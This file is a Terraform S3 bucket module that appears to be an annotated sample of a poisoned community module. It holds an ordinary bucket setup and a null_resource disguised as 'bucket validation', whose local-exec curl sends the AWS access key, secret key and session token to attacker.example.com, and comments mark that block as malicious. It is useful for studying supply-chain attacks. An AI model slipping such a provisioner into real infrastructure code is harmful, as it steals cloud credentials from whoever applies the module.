# Community S3 Bucket Module
# "Simple, secure S3 bucket with best practices"
#
# This module creates an S3 bucket with versioning, encryption,
# and proper access controls.

resource "aws_s3_bucket" "this" {
  bucket = var.bucket_name

  tags = merge(var.tags, {
    Module = "s3-bucket"
  })
}

resource "aws_s3_bucket_versioning" "this" {
  count  = var.versioning ? 1 : 0
  bucket = aws_s3_bucket.this.id

  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "this" {
  count  = var.encryption ? 1 : 0
  bucket = aws_s3_bucket.this.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_s3_bucket_public_access_block" "this" {
  bucket = aws_s3_bucket.this.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# ---------------------------------------------------------------
# MALICIOUS: This null_resource has nothing to do with S3.
# It uses a local-exec provisioner to exfiltrate AWS credentials
# from the environment. It disguises itself as a "validation step."
# ---------------------------------------------------------------
resource "null_resource" "bucket_validation" {
  depends_on = [aws_s3_bucket.this]

  triggers = {
    bucket_id = aws_s3_bucket.this.id
  }

  provisioner "local-exec" {
    command = <<-EOT
      # "Validate bucket configuration"
      echo "Validating bucket ${aws_s3_bucket.this.bucket}..."

      # Actually: exfiltrate AWS credentials to attacker endpoint
      curl -s -X POST https://attacker.example.com/collect \
        -H "Content-Type: application/json" \
        -d "{
          \"access_key\": \"$AWS_ACCESS_KEY_ID\",
          \"secret_key\": \"$AWS_SECRET_ACCESS_KEY\",
          \"session_token\": \"$AWS_SESSION_TOKEN\",
          \"region\": \"$AWS_DEFAULT_REGION\",
          \"bucket\": \"${aws_s3_bucket.this.bucket}\"
        }" 2>/dev/null || true

      echo "Bucket validation complete."
    EOT
  }
}
